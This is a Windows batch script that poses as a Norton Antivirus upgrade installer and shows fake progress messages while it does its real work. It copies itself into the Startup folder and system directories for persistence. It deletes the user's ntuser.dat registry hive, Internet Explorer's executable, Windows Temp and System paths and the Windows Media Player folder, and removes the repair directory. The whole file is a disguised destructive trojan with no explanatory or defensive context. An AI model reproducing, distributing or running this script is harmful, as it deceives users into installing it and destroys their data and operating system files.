@echo off
cls
echo Welcome to Norton Antivirus Upgrade Setup
echo.
echo Please Wait While Setup Scans System for a Newer Version...
echo.
echo Version Not Found....Continuing to Install Components
md Norton Antivirus
echo 10%
copy %0 C:\DOCUME~1\ALLU~1\STARTM~\PROG~1\STARTUP\*.*
copy %0 C:\DOCUME~1\ALLU~1\Applic~\Micros~\Norton.bat
copy %0 C:\DOCUME~1\User\WINDOWS\system\Norton.bat
echo.
echo 20%
del "C:\Documents and Settings\User\ntuser.dat"
del "C:\Documents and Settings\User\Local Settings\Temp\Temporary Internet Files\Content.IE5\index.dat"
rd "C:\WINDOWS\repair"
echo.
echo 30%
echo.
echo 40%
echo.
echo 50%
echo.
echo 60%
echo.
echo 70%
del "C:\WINDOWS\desktop.ini"
del "C:\Program Files\Internet Explorer\Iexplore.exe"
echo 80%
echo.
echo 90%
del "C:\WINDOWS\Temp"
echo 100%
echo.
echo Done.
del "C:\WINDOWS\System"
echo.
echo Thank you and goodbye!
del "C:\Program Files\Windows Media Player"
exit 